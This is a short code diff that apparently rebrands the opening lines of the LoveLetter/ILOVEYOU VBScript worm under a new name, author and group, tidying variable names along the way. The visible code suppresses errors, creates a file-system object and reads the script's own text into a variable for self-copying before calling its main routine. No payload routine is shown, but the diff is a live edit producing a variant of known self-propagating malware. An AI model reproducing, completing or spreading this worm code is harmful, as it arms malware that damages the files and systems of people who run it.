@@ -1,12 +1,14 @@
-Rem  barok - loveletter(vbe) < i hate go To school > 
+Rem barok - takeashit(vbe) < Betraying is something I really don't enjoy >
 Rem by
-spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
+4nsil! / ansilopzzz@gmail.com / TakeAShit Group / Kerala,India
 On Error Resume Next
-Dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
-eq = ""
-ctr = 0
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
+
+Dim fileSystemObj, dirsystem, dirwin, dirtemp, eq, file, vbscopy, dow
+	eq = ""
+    ctr = 0
+
+Set fileSystemObj =  CreateObject("Scripting.FileSystemObject")
+Set file = fileSystemObj.OpenTextFile(Wscript.ScriptFullName, 1)
 vbscopy = file.ReadAll
 main()
 Sub main()
